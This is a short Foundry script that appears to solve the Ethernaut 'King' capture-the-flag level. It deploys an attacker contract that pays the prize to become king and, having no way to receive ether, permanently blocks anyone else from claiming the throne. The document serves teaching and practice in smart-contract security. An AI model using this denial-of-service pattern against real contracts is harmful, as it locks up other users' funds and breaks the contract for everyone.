// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";
import {Script, console} from "forge-std/script.sol";

contract KingSolution is Script {
    King king = King(payable(0x57C6Ef50B0E3F40E3De54EFed827483e0aB66c26));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("King before is: ", king._king());
        new Attacker(king);
        console.log("King after is: ", king._king());
        vm.stopBroadcast();
    }
}

contract Attacker {
    constructor(King _king) {
        address(_king).call{value: _king.prize()}("");
    }
}
